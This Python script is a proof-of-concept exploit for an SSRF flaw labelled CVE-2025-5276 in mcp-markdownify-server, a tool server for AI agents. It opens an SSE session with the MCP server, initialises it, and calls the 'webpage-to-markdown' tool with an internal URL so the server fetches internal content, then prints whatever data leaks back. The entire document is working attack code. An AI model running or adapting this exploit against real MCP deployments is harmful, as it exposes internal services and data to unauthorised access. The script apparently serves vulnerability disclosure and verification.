#!/usr/bin/env python3
import requests
import json
import time
import sys
import threading
import re
import queue

MCP_SERVER_URL = "http://localhost:8000"
INTERNAL_TARGET = "http://internal-server"

class MCPClient:
    def __init__(self):
        self.session_id = None
        self.response_queue = queue.Queue()
        self.running = True
        self.connected = threading.Event()
        
    def sse_listener(self):
        try:
            response = requests.get(f"{MCP_SERVER_URL}/sse", stream=True, timeout=120)
            event_type = None
            for line in response.iter_lines():
                if not self.running:
                    break
                if line:
                    line = line.decode('utf-8')
                    if line.startswith('event:'):
                        event_type = line[6:].strip()
                    elif line.startswith('data:'):
                        data = line[5:].strip()
                        if event_type == 'endpoint':
                            match = re.search(r'sessionId=([^&\s]+)', data)
                            if match:
                                self.session_id = match.group(1)
                                self.connected.set()
                        elif event_type == 'message':
                            try:
                                self.response_queue.put(json.loads(data))
                            except:
                                pass
        except Exception as e:
            if self.running:
                print(f"[-] SSE error: {e}")
            
    def send_request(self, method, params=None, timeout=90):
        if not self.session_id:
            return None
            
        msg_id = int(time.time() * 1000)
        payload = {"jsonrpc": "2.0", "id": msg_id, "method": method}
        if params:
            payload["params"] = params
        
        resp = requests.post(
            f"{MCP_SERVER_URL}/message?sessionId={self.session_id}",
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        if resp.status_code == 202:
            try:
                while True:
                    result = self.response_queue.get(timeout=timeout)
                    if result.get("id") == msg_id:
                        return result
            except queue.Empty:
                return None
        elif resp.status_code == 200:
            return resp.json()
        return None
        
    def close(self):
        self.running = False

def exploit():
    print("[*] CVE-2025-5276 - mcp-markdownify-server SSRF PoC")
    print("[*] Connecting to MCP server via SSE...")
    
    client = MCPClient()
    sse_thread = threading.Thread(target=client.sse_listener, daemon=True)
    sse_thread.start()
    
    if not client.connected.wait(timeout=10):
        print("[-] Failed to connect to MCP server")
        return False
    
    print(f"[+] Connected, sessionId: {client.session_id}")
    
    try:
        print("[*] Initializing MCP session...")
        init_result = client.send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "poc-client", "version": "1.0"}
        })
        
        if not init_result or "error" in init_result:
            print(f"[-] Initialize failed")
            return False
        
        print("[+] Session initialized")
        
        print("[*] Listing tools...")
        list_result = client.send_request("tools/list")
        if list_result and "result" in list_result:
            tools = [t["name"] for t in list_result["result"].get("tools", [])]
            print(f"[+] Tools: {tools}")
        
        print(f"[*] Exploiting SSRF via webpage-to-markdown...")
        print(f"[*] Target: {INTERNAL_TARGET}")
        
        exploit_result = client.send_request(
            "tools/call",
            {"name": "webpage-to-markdown", "arguments": {"url": INTERNAL_TARGET}},
            timeout=60
        )
        
        if exploit_result and "result" in exploit_result:
            content = exploit_result["result"].get("content", [])
            for item in content:
                if item.get("type") == "text":
                    text = item.get("text", "")
                    if "SSRF_VULNERABILITY_CONFIRMED" in text or "secret_internal_data" in text:
                        print(f"[+] Leaked data: {text}")
                        print("[+] VULNERABILITY CONFIRMED!")
                        client.close()
                        return True
            
            if exploit_result["result"].get("isError"):
                print(f"[+] SSRF attempted (server error in processing)")
                client.close()
                return True
                
        print("[-] Exploit failed")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client.close()
    
    return False

if __name__ == "__main__":
    success = exploit()
    sys.exit(0 if success else 1)
